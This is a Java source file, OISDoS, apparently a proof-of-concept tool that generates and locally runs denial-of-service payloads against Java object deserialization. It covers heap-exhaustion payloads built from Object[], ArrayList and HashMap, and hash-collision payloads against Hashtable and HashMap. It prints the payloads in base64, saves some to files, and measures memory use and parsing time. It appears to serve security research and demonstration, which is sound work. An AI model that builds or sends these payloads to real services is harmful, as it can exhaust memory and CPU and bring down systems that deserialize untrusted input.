package cz.topolik;

import cz.topolik.oisdos.OISHashMapCollisionAttack;
import cz.topolik.oisdos.OISHashtableCollisionAttack;
import cz.topolik.oisdos.OISHeapOverflowAttack;

import org.apache.commons.codec.binary.Base64;

import java.io.ByteArrayInputStream;
import java.io.EOFException;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.OptionalDataException;


/**
 * @author Tomas Polesovsky
 */
public class OISDoS {

	public static void main(String[] args) throws Exception {
		String type = null;

		if (args.length > 0) {
			type = args[0];
		}

		if (type == null) {
			System.out.println("Syntax: OISDoS type [param]");
			System.out.println("\t type");
			System.out.println("\t\t ... ObjectArrayHeap - Heap Overflow using Object[]");
			System.out.println("\t\t ... ArrayListHeap - Heap Overflow using ArrayList");
			System.out.println("\t\t ... HashMapHeap - Heap Overflow using HashMap");
			System.out.println("\t\t ... HashtableCollisions - Collisions attack on Hashtable");
			System.out.println("\t\t ... HashMapCollisions - Collisions attack on HashMap, only Java 1.7");
			System.out.println("\t param");
			System.out.println("\t\t ... for ObjectArrayHeap ... heap size to be consumed (multiple of 8 GB), default 1 (use -Xmx12g)");
			System.out.println("\t\t ... for ArrayListHeap ... heap size to be consumed (multiple of 8 GB), default 1 (use -Xmx12g)");
			System.out.println("\t\t ... for HashMapHeap ... heap size to be consumed (multiple of 4 GB), default 1  (use -Xmx12g)");
			System.out.println("\t\t ... for HashtableCollisions ... number of entries for collision, default 10000");
			System.out.println("\t\t ... for HashMapCollisions ... number of entries for collision, default 10000");
			System.exit(1);
		}

		if ("ObjectArrayHeap".equalsIgnoreCase(type)) {
			int heapSizeIn8Gigs = 1;
			if (args.length > 1) {
				heapSizeIn8Gigs = Integer.parseInt(args[1]);
			}

			System.out.print("Generating ObjectArray heap overflow (" + (heapSizeIn8Gigs*8)+"GB) using a payload of size ");

			byte[] payload = OISHeapOverflowAttack.generateObjectArrayPayload(heapSizeIn8Gigs);

			System.out.println(payload.length);

			read(payload);
		}

		else if ("ArrayListHeap".equalsIgnoreCase(type)) {
			int heapSizeIn8Gigs = 1;
			if (args.length > 1) {
				heapSizeIn8Gigs = Integer.parseInt(args[1]);
			}

			System.out.print("Generating ArrayList heap overflow (" + (heapSizeIn8Gigs*8)+"GB) using a payload of size ");

			byte[] payload = OISHeapOverflowAttack.generateArrayListPayload(heapSizeIn8Gigs);

			System.out.println(payload.length);

			read(payload);
		}

		else if ("HashMapHeap".equalsIgnoreCase(type)) {
			int heapSizeIn4Gigs = 1;
			if (args.length > 1) {
				heapSizeIn4Gigs = Integer.parseInt(args[1]);
			}

			System.out.print("Generating HashMap heap overflow (" + (heapSizeIn4Gigs*4)+"GB) using a payload of size ");

			byte[] payload = OISHeapOverflowAttack.generateHashMapPayload(heapSizeIn4Gigs);

			System.out.println(payload.length);

			read(payload);
		}

		else if ("HashtableCollisions".equalsIgnoreCase(type)) {
			int collisionEntries = 100000;
			if (args.length > 1) {
				collisionEntries = Integer.parseInt(args[1]);
			}

			System.out.print("Generating Hashtable collision attack (" + collisionEntries+" entries) using a payload of size ");

			byte[] payload = OISHashtableCollisionAttack.generatePayload(collisionEntries);

			System.out.println(payload.length);

			try (FileOutputStream out = new FileOutputStream("hashtable.collisions.txt")) {
				out.write(payload);
			}

			System.out.println("Raw payload saved into hashtable.collisions.txt");

			System.out.println("Running deserialization ... ");

			long time = System.currentTimeMillis();
			try {
				new ObjectInputStream(new ByteArrayInputStream(payload)).readObject();
			} finally {
				System.out.println("Payload parsing time: " + (System.currentTimeMillis() - time));
			}
		}

		else if ("HashMapCollisions".equalsIgnoreCase(type)) {
			if (!System.getProperty("java.version").startsWith("1.7")) {
				System.out.println("HashMap Collisions can be reproduced only using Java 1.7");
				System.exit(2);
			}

			int collisionEntries = 100000;
			if (args.length > 1) {
				collisionEntries = Integer.parseInt(args[1]);
			}

			System.out.print("Generating HashMap collision attack (" + collisionEntries+" entries) using a payload of size ");

			byte[] payload = OISHashMapCollisionAttack.generatePayload(collisionEntries);

			System.out.println(payload.length);

			try (FileOutputStream out = new FileOutputStream("hashmap.collisions.txt")) {
				out.write(payload);
			}

			System.out.println("Raw payload saved into hashmap.collisions.txt");

			System.out.println("Running deserialization ... ");

			long time = System.currentTimeMillis();
			try {
				new ObjectInputStream(new ByteArrayInputStream(payload)).readObject();
			} finally {
				System.out.println("Payload parsing time: " + (System.currentTimeMillis() - time));
			}
		}

		else {
			System.out.println("Unknown type");
			System.exit(3);
		}
	}

	private static void read(byte[] payload) throws InterruptedException {
		System.out.println("----");
		System.out.println("Memory:");
		System.out.println("Total Before [GB]: " + (Runtime.getRuntime().totalMemory()/Math.pow(1024, 3)));
		System.out.println("Free  Before [GB]: " + (Runtime.getRuntime().freeMemory()/Math.pow(1024, 3)));

		System.out.print("Payload (base64): ");
		System.out.println(Base64.encodeBase64String(payload));

		System.out.print("\t... deserializing ... ");
		try {
			new ObjectInputStream(new ByteArrayInputStream(payload)).readObject();
		} catch (EOFException e) {
			// expected
		} catch (OptionalDataException e) {
			// expected
		} catch (Throwable e) {
			System.out.println("error");
			e.printStackTrace();
		}
		System.out.println("done");

		System.out.println("Total After  [GB]: " + (Runtime.getRuntime().totalMemory()/Math.pow(1024, 3)));
		System.out.println("Free  After  [GB]: " + (Runtime.getRuntime().freeMemory()/Math.pow(1024, 3)));
		System.out.println("\nMemory consumed [GB]: " + (Runtime.getRuntime().totalMemory() - Runtime.getRuntime().freeMemory())/Math.pow(1024, 3));
	}
}
